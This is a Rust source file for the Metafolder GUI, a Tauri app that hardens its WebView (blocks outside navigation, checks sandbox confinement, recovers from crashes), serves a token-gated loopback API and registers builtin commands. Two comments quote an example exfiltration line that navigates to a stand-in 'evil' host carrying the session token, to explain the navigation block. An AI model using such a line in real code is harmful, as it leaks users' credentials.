//! Metafolder GUI: a Tauri application over the daemon HTTP API (spec-gui).
//!
//! The Rust side owns all canonical state (workspaces, layout, keybindings,
//! command registry); the Svelte shell in `frontend/` is a thin reflection
//! updated through Tauri events. An Axum server (default port 7524) serves
//! panel-type directories and the scripting API.

pub mod bash_complete;
pub mod command_registry;
pub mod commands;
pub mod config;
pub mod daemon_proxy;
pub mod diagnostics;
pub mod documents;
pub mod duplicates;
pub mod events;
pub mod fs_commands;
pub mod fs_path;
pub mod history;
pub mod ignore;
pub mod keybindings;
pub mod media_support;
pub mod notifier;
pub mod order;
pub mod orphan;
pub mod proc;
pub mod recent;
pub mod reconcile;
pub mod repo_init;
pub mod sandbox;
pub mod server;
pub mod shell_exec;
pub mod slow;
pub mod state;
pub mod style_watcher;
pub mod sync;
pub mod thumbnails;
pub mod trash;
pub mod undo;

use command_registry::CommandRegistry;
use config::ConfigDir;
use keybindings::CompiledBinding;
use notifier::FrontendNotifier;
use state::GuiState;
use std::sync::{Arc, Mutex};
use tauri::Emitter;

/// Startup options, from CLI flags. Each is an optional override of the
/// corresponding `config.toml` setting (which itself defaults sensibly).
pub struct Options {
    pub gui_port: Option<u16>,
    pub daemon_port: Option<u16>,
    /// Run with an unsandboxed WebView (development escape hatch — see the
    /// flag's help in `main.rs`). The media helpers stay sandboxed regardless:
    /// they fail closed on their own.
    pub allow_unsandboxed_webview: bool,
}

/// Production notifier: forwards engine events to the WebView.
struct TauriNotifier(tauri::AppHandle);

impl FrontendNotifier for TauriNotifier {
    fn emit(&self, event: &str, payload: serde_json::Value) {
        let _ = self.0.emit(event, payload);
    }
}

/// Emits the compiled keybinding table to the frontend.
pub(crate) fn push_keybindings(gui: &GuiState, compiled: &[CompiledBinding]) {
    gui.notify(events::KEYBINDINGS_CHANGED, serde_json::json!({ "bindings": compiled }));
}

/// Shell builtins shown in the command input autocomplete (spec-gui
/// "Command names"). Handlers live in the frontend dispatcher.
fn register_builtins(registry: &CommandRegistry) {
    // The `log` column controls whether an invocation is echoed to the
    // message panel. Basic editing primitives (which fire on nearly every
    // keystroke) opt out to keep the log readable.
    for (name, label, log) in [
        ("command-input:focus", "Focus the command input (command / bash mode)", false),
        ("editing:unfocus", "Leave the focused text input", false),
        ("editing:discard", "Clear and leave the focused text input", false),
        ("editing:confirm", "Confirm the focused text input", false),
        ("editing:goto", "Move the cursor to the line start / line end", false),
        ("workspace:new", "Create a workspace and show it in both slots", true),
        ("workspace:close", "Close the focused slot's workspace", true),
        ("workspace:rename", "Rename the focused slot's workspace", true),
        ("workspace:goto", "Move both panels to workspace number N", true),
        ("workspace:next", "Move to the next workspace (`slot`: the focused slot only)", true),
        ("workspace:prev", "Move to the previous workspace (`slot`: the focused slot only)", true),
        ("panel:split", "Show the second panel slot", true),
        ("panel:unsplit", "Hide the non-focused panel slot", true),
        ("panel:hide", "Hide the focused panel slot", true),
        ("panel:toggle", "Toggle a layout flag (split / fullscreen)", true),
        ("panel:focus", "Focus a panel slot (next / left / right)", true),
        ("panel:set", "Change a layout setting (type)", true),
        ("panel:swap", "Exchange the two slots' panel types", true),
        ("panel:reveal", "Show a panel type for this workspace in the other slot", true),
        ("message:clear", "Clear the workspace message log", true),
        ("status:clear", "Clear the status bar message", false),
        ("config:open", "Open the settings view", true),
        (
            "config:reload",
            "Re-read user configuration without a restart (keybindings / style / grammar / all)",
            true,
        ),
        ("devtools:open", "Open the WebKit web inspector", true),
        ("quit", "Exit the GUI", true),
        ("daemon:set", "Change a daemon setting (url)", true),
        ("repos:open", "Open the repository panel in the focused slot", true),
        ("repos:switch", "Open a loaded repository in the current or a new workspace", true),
        (
            "file-manager:reveal",
            "Open the selected metarecord's folder in the file manager (focused panel)",
            true,
        ),
        (
            "metarecord-list:folder",
            "List the selected metarecord's folder in the metarecord list (focused panel)",
            true,
        ),
        ("recent", "Open a recently-viewed metarecord", true),
        ("file:open-with", "Open the selected file or folder with an external program", true),
        ("script:run", "Run an installed helper script", true),
        ("reconcile:run", "Reconcile the active repository with the filesystem", true),
        (
            "mf:duplicate",
            "Scan the active repository for byte-identical files (mf duplicate scan)",
            true,
        ),
        (
            "orphan:detect",
            "Mark the active repository's orphaned metarecords orphan = true (mf orphan detect)",
            true,
        ),
        ("orphan:delete", "Delete the metarecords marked orphan = true (confirmed)", true),
        (
            "orphan:detect-delete",
            "Mark the orphaned metarecords, then delete them (confirmed)",
            true,
        ),
        ("mf:order", "Number a folder's direct children (order_file/order_dir)", true),
        ("ignore:list", "Show the ignore presets and the target directory's patterns", true),
        ("ignore:add", "Append an ignore preset's patterns to the target directory", true),
        ("ignore:remove", "Remove an ignore preset's patterns from the target directory", true),
        ("ignore:set", "Replace the target directory's ignore set with a preset", true),
        ("metarecord:trash", "Send the selected metarecord's file to the trash", true),
        ("log:undo", "Undo the last revision of the active repository", true),
        ("log:redo", "Re-apply the revision ahead of HEAD", true),
        ("answer:send", "Resolve the pending script input wait", true),
        ("script-keys:toggle", "Give the script's keys back to the GUI, or take them again", true),
        ("script:stop", "Stop the running script (the one asking, by default)", true),
        ("pick:confirm", "Confirm the value picker's selection", true),
        ("pick:cancel", "Cancel the value picker", true),
        // Find in panel (spec-gui "Find in panel"). `log=false`: stepping
        // through matches is a keystroke-level action, not a command worth a
        // message-log line.
        ("find:open", "Find text in the focused panel (optional text)", false),
        ("find:next", "Go to the next find match", false),
        ("find:prev", "Go to the previous find match", false),
        ("find:close", "Close the find bar", false),
        // Help (spec-gui "Help"). `log=false`: the help-cursor drives these on
        // every click, which would otherwise flood the message log.
        ("help", "Open the help panel (optional topic)", false),
        ("help:open", "Open help for a topic", false),
        ("help:cursor", "Click an element to open its help", false),
    ] {
        registry.register_builtin(name, label, log);
    }
}

/// Builds and runs the Tauri application; blocks until the window closes.
/// Closes the two holes a fresh WebView leaves open, on the one platform whose
/// WebView we can reach into.
///
/// Navigation, first: the CSP stops the web realm from *fetching* anything
/// remote, but no CSP directive governs navigation — a `location.href =
/// 'https://evil/?' + token` would still leave, carrying the session token in
/// the URL. Any navigation outside the app's own origins is refused, so the
/// WebView has no route to the internet at all.
///
/// Crash recovery, second: the shell and every panel share one web process, so a
/// WebKit crash (a GStreamer failure in a media pipeline, say) would leave the
/// window frozen on its last frame. Rust owns all canonical state, so reloading
/// the shell loses nothing — but a second crash shortly after a reload means the
/// reload re-triggers it, so we stop there rather than loop.
#[cfg(target_os = "linux")]
fn harden_webview(tauri_app: &tauri::App) {
    if let Some(window) = tauri::Manager::get_webview_window(tauri_app, "main") {
        let _ = window.with_webview(|webview| {
            use webkit2gtk::glib::object::Cast;
            use webkit2gtk::{
                NavigationPolicyDecisionExt, PolicyDecisionExt, PolicyDecisionType, URIRequestExt,
                WebViewExt,
            };

            // The CSP stops the web realm from *fetching* anything
            // remote, but no CSP directive governs navigation: a
            // `location.href = 'https://evil/?' + token` would still
            // leave, carrying the session token in the URL. Refuse any
            // navigation outside the app's own origins, so the WebView
            // has no route to the internet at all.
            webview.inner().connect_decide_policy(|_webview, decision, kind| {
                if !matches!(
                    kind,
                    PolicyDecisionType::NavigationAction | PolicyDecisionType::NewWindowAction
                ) {
                    return false; // a response decision: not ours
                }
                let uri = decision
                    .clone()
                    .downcast::<webkit2gtk::NavigationPolicyDecision>()
                    .ok()
                    .and_then(|navigation| navigation.navigation_action())
                    .and_then(|action| action.request())
                    .and_then(|request| request.uri())
                    .map(|uri| uri.to_string());
                // An unreadable target is refused, like a remote one.
                let allowed = uri.as_deref().map(sandbox::is_local_navigation).unwrap_or(false);
                if !allowed {
                    eprintln!(
                        "metafolder-gui: blocked a navigation out of the app: {}",
                        uri.as_deref().unwrap_or("<unreadable>")
                    );
                    decision.ignore();
                    return true; // handled: the navigation is dropped
                }
                false
            });

            // The web process is confined by WEBKIT_FORCE_SANDBOX, set
            // in `sandbox::preflight`. Not by
            // `WebContext::set_sandbox_enabled`: by the time Tauri hands
            // us the webview the web process is already running, and
            // WebKit aborts the app ("sandboxing cannot be changed after
            // subprocesses were spawned"). The env var is read earlier,
            // when the process is spawned.
            let last_crash = std::cell::Cell::new(None::<std::time::Instant>);
            webview.inner().connect_web_process_terminated(move |webview, reason| {
                let now = std::time::Instant::now();
                let rapid = last_crash
                    .get()
                    .is_some_and(|previous| now - previous < std::time::Duration::from_secs(10));
                last_crash.set(Some(now));
                if rapid {
                    eprintln!(
                        "metafolder-gui: web process terminated again \
                             ({reason:?}); not reloading (crash loop)"
                    );
                    return;
                }
                eprintln!(
                    "metafolder-gui: web process terminated ({reason:?}); \
                         reloading the shell"
                );
                webview.reload();
            });
        });
    }
}

/// Checks, once the WebView has had time to spawn its web process, that the
/// process really is confined.
///
/// Enabling the sandbox is one thing; being confined is another. If the web
/// process shares our namespaces, a crafted image or video would be decoded with
/// our privileges — so we refuse to keep running rather than present a window
/// that looks safe. An inconclusive probe (no web process found, unreadable
/// namespace) says nothing and is ignored.
#[cfg(target_os = "linux")]
fn spawn_confinement_probe(allow_unsandboxed: bool) {
    std::thread::spawn(move || {
        std::thread::sleep(std::time::Duration::from_secs(5));
        if allow_unsandboxed {
            return;
        }
        if sandbox::web_process_status() == sandbox::WebProcess::Unconfined {
            eprintln!(
                "metafolder-gui: WebKit's web process is not sandboxed — it would \
                 decode untrusted media (images, video) with your full privileges. \
                 Refusing to run."
            );
            std::process::exit(1);
        }
    });
}

/// Polls the daemon for reachability and drains its diagnostics feed
/// (spec-gui "Connection to the daemon").
fn spawn_health_polling(
    daemon: Arc<daemon_proxy::DaemonProxy>,
    gui: Arc<GuiState>,
    interval: std::time::Duration,
) {
    tauri::async_runtime::spawn(async move {
        loop {
            // Only drain diagnostics from a daemon we can reach; a failed probe
            // would only produce a failed feed request.
            if daemon.check_health(&gui).await {
                daemon.drain_diagnostics(&gui).await;
            }
            tokio::time::sleep(interval).await;
        }
    });
}

/// Serves panel assets, `/fsraw` and the scripting API on the loopback port.
///
/// The port is fixed by `config.toml` (the CLI reads the same file), so a
/// failure to bind it is reported and left at that — there is no fallback port
/// to move to, and nothing to write it down in.
fn spawn_http_server(state: server::ServerState, token: Arc<str>, port: u16) {
    tauri::async_runtime::spawn(async move {
        let router = server::build_router_authenticated(state, token);
        let address = std::net::SocketAddr::from(([127, 0, 0, 1], port));
        match tokio::net::TcpListener::bind(address).await {
            Ok(listener) => {
                if let Err(error) = axum::serve(listener, router).await {
                    eprintln!("metafolder-gui: HTTP server failed: {error}");
                }
            }
            Err(error) => eprintln!("metafolder-gui: cannot bind 127.0.0.1:{port}: {error}"),
        }
    });
}

/// The value, or a fatal exit printing the error.
///
/// Every start-up step below takes this shape: the configuration is installed by
/// `metafolder-sync-config`, and a missing or invalid piece of it has no usable
/// fallback (spec-config "No runtime fallback"). Refusing to start says so once,
/// where a default would hide it until something behaved oddly hours later.
fn or_exit<T, E: std::fmt::Display>(result: Result<T, E>) -> T {
    match result {
        Ok(value) => value,
        Err(error) => {
            eprintln!("metafolder-gui: {error}");
            std::process::exit(1);
        }
    }
}

pub fn run(options: Options) {
    // Untrusted media (any image or video the panels display, thumbnail or
    // probe) is decoded by C libraries with a long history of memory-safety
    // bugs. Every decoder must run sandboxed — the WebView's web process and
    // the ffmpeg/gst-discoverer helpers alike, all of which need a working
    // bubblewrap. Verified *first*, and fatal: rendering a crafted file
    // unconfined is not a degraded feature, it is a hole. This also sets
    // WEBKIT_FORCE_SANDBOX, which must precede the WebView's creation.
    if let Err(error) = sandbox::preflight(options.allow_unsandboxed_webview) {
        eprintln!("metafolder-gui: {error}");
        std::process::exit(1);
    }
    if options.allow_unsandboxed_webview {
        eprintln!(
            "metafolder-gui: WARNING --allow-unsandboxed-webview: images and video are \
             decoded with your full privileges; a crafted file can take over the session. \
             Development only."
        );
    }

    let config =
        Arc::new(ConfigDir::default_location().expect("cannot resolve the user config directory"));

    let registry = Arc::new(CommandRegistry::new());
    register_builtins(&registry);
    // The configuration is installed by `metafolder-sync-config`; a missing or
    // invalid file is fatal (spec-config "No runtime fallback").
    let keybindings = or_exit(config.load_keybindings());
    // The simplified-query grammar (shared, in core): expansion is done locally
    // by the GUI backend, never proxied to the daemon (spec-query).
    let grammar = or_exit(metafolder_core::simplified::load::load_source());

    // GUI settings (config.toml), with the CLI flags as optional overrides.
    // A missing config file is fatal (spec-config "No runtime fallback").
    let gui_config = or_exit(config.load_config());
    let gui_port = options.gui_port.unwrap_or(gui_config.gui_port);
    let page_sizes = gui_config.page_size.clone();
    let picker_seeds = gui_config.picker_seeds.clone();
    let ref_completion_seeds = gui_config.ref_completion_seeds.clone();
    let open_with = gui_config.open_with.clone();
    let settings = gui_config.settings.clone();
    let cache_sizes = gui_config.cache.clone();
    let panel_settings = gui_config.panels.clone();
    let panel_defaults = gui_config.panel_defaults.clone();
    let health_poll_interval = settings.daemon_health_poll();
    let daemon_url = match options.daemon_port {
        Some(port) => format!("http://127.0.0.1:{port}"),
        None => gui_config.daemon_base_url(),
    };
    let daemon = Arc::new(daemon_proxy::DaemonProxy::with_slow_threshold(
        daemon_url,
        settings.slow_operation_threshold_ms,
    ));

    // Session token (spec-auth): gates the GUI server's sensitive routes and
    // is handed to the WebView through the initial state.
    let gui_token: Arc<str> = or_exit(
        metafolder_core::auth::ensure_token("gui")
            .map_err(|error| format!("cannot establish the session token: {error}")),
    )
    .into();

    tauri::Builder::default()
        .setup(move |tauri_app| {
            let notifier = Arc::new(TauriNotifier(tauri_app.handle().clone()));
            let gui = Arc::new(GuiState::new(notifier));
            let style_watcher = match style_watcher::watch(config.clone(), gui.clone()) {
                Ok(watcher) => Some(watcher),
                Err(error) => {
                    eprintln!("metafolder-gui: style auto-reload disabled: {error}");
                    None
                }
            };
            let keybindings = Arc::new(Mutex::new(keybindings));
            let input = Arc::new(server::input_wait::InputWait::new());
            let command_wait = Arc::new(server::command_wait::CommandWait::new());
            let bench = Arc::new(server::bench::BenchBuffer::new());
            let app = Arc::new(commands::App {
                gui: gui.clone(),
                registry,
                config: config.clone(),
                keybindings: keybindings.clone(),
                grammar: Mutex::new(grammar),

                gui_port,
                page_sizes: page_sizes.clone(),
                picker_seeds: picker_seeds.clone(),
                ref_completion_seeds: ref_completion_seeds.clone(),
                open_with: open_with.clone(),
                settings: settings.clone(),
                cache_sizes: cache_sizes.clone(),
                panel_settings: panel_settings.clone(),
                panel_defaults: panel_defaults.clone(),
                daemon: daemon.clone(),
                input: input.clone(),
                commands: command_wait.clone(),
                bench: bench.clone(),
                style_watcher: Mutex::new(style_watcher),
                gui_token: gui_token.clone(),
            });
            tauri::Manager::manage(tauri_app, app);

            // The WebView is not safe as handed to us: it can navigate out of the
            // app, and a web-process crash freezes the window.
            #[cfg(target_os = "linux")]
            harden_webview(tauri_app);

            #[cfg(target_os = "linux")]
            spawn_confinement_probe(options.allow_unsandboxed_webview);
            spawn_health_polling(daemon.clone(), gui.clone(), health_poll_interval);
            spawn_http_server(
                server::ServerState {
                    config: config.clone(),
                    gui: gui.clone(),
                    daemon: daemon.clone(),
                    keybindings,
                    input,
                    commands: command_wait,
                    bench,
                    repo_list_cache_ttl: settings.repo_list_cache_ttl(),
                },
                gui_token.clone(),
                gui_port,
            );
            Ok(())
        })
        .on_window_event({
            move |window, event| {
                if let tauri::WindowEvent::Destroyed = event {
                    let handle = tauri::Manager::app_handle(window);
                    let app: tauri::State<'_, Arc<commands::App>> = tauri::Manager::state(handle);
                    // Pending script waits resolve with "closed".
                    app.input.close_all();
                    app.commands.close_all();
                }
            }
        })
        .invoke_handler(tauri::generate_handler![
            commands::get_initial_state,
            commands::workspace_new,
            commands::workspace_close,
            commands::workspace_close_ws,
            commands::workspace_rename,
            commands::tab_assign,
            commands::workspace_next_in_slot,
            commands::workspace_prev_in_slot,
            commands::workspace_goto,
            commands::workspace_next,
            commands::workspace_prev,
            commands::panel_split,
            commands::panel_unsplit,
            commands::panel_split_toggle,
            commands::slot_hide,
            commands::panel_focus_next,
            commands::focus_slot,
            commands::panel_set_type,
            commands::panel_swap,
            commands::ws_get_var,
            commands::ws_set_var,
            commands::ws_vars,
            commands::adopt_repo,
            commands::list_commands,
            commands::register_command,
            commands::script_keys_toggle,
            commands::script_stop,
            commands::suggest_keybinding,
            commands::get_compiled_keybindings,
            commands::set_user_keybinding,
            commands::remove_user_keybinding,
            commands::list_panel_types,
            commands::load_style,
            commands::config_info,
            fs_commands::fs_read_dir,
            fs_commands::fs_stat,
            fs_commands::fs_exists,
            fs_commands::fs_home_dir,
            fs_commands::fs_mkdir,
            fs_commands::fs_create_file,
            fs_commands::fs_move,
            fs_commands::fs_copy,
            fs_commands::fs_delete,
            commands::history_read,
            commands::history_append,
            commands::recent_read,
            commands::recent_touch,
            commands::list_scripts,
            shell_exec::run_shell,
            bash_complete::bash_complete,
            commands::daemon_request,
            commands::daemon_set_url,
            commands::daemon_health,
            commands::parse_query,
            commands::expand_query,
            commands::grammar_source,
            commands::config_reload,
            reconcile::reconcile_run,
            duplicates::duplicate_scan,
            orphan::orphan_detect,
            orphan::orphan_count,
            orphan::orphan_delete,
            sync::sync_status,
            sync::sync_link,
            sync::sync_unlink,
            sync::sync_plan,
            sync::sync_run,
            sync::sync_show,
            repo_init::repo_init,
            order::order_run,
            ignore::ignore_presets,
            ignore::ignore_current,
            ignore::ignore_apply,
            ignore::ignore_write,
            trash::trash_list,
            trash::trash_selected_metarecord,
            trash::trash_path,
            trash::trash_restore,
            trash::trash_remove,
            trash::trash_empty,
            undo::log_navigate,
            commands::answer_send,
            commands::pick_start,
            commands::pick_confirm,
            commands::pick_cancel,
            commands::picker_seed,
            commands::ref_completion_seed,
            commands::open_with_programs,
            commands::command_done,
            commands::bench_record,
            commands::prompt_resolve,
            commands::panel_ready,
            commands::post_status,
            commands::get_messages,
            commands::clear_messages,
            commands::append_message,
            commands::open_devtools,
            commands::set_fullscreen,
            commands::quit,
        ])
        .run(tauri::generate_context!())
        .expect("error while running the metafolder GUI");
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_devtools_open_is_a_builtin() {
        let registry = CommandRegistry::new();
        register_builtins(&registry);
        let def = registry.get("devtools:open").expect("devtools:open registered");
        assert_eq!(def.owner, None);
    }

    #[test]
    fn test_panel_hide_is_a_builtin() {
        let registry = CommandRegistry::new();
        register_builtins(&registry);
        assert!(registry.get("panel:hide").is_some(), "panel:hide registered");
    }

    #[test]
    fn test_workspace_and_fullscreen_commands_are_builtins() {
        let registry = CommandRegistry::new();
        register_builtins(&registry);
        for name in ["workspace:next", "workspace:prev", "workspace:goto", "panel:toggle"] {
            assert!(registry.get(name).is_some(), "{name} registered");
        }
        // The parameter-in-name form is gone.
        assert!(registry.get("workspace:goto-N").is_none());
    }

    #[test]
    fn test_help_commands_are_builtins() {
        // The help commands must exist before the help panel is ever mounted
        // (panel commands only register at mount), so they are shell builtins.
        let registry = CommandRegistry::new();
        register_builtins(&registry);
        for name in ["help", "help:open", "help:cursor"] {
            let def = registry.get(name).unwrap_or_else(|| panic!("{name} registered"));
            assert_eq!(def.owner, None, "{name} is a builtin");
        }
    }
}
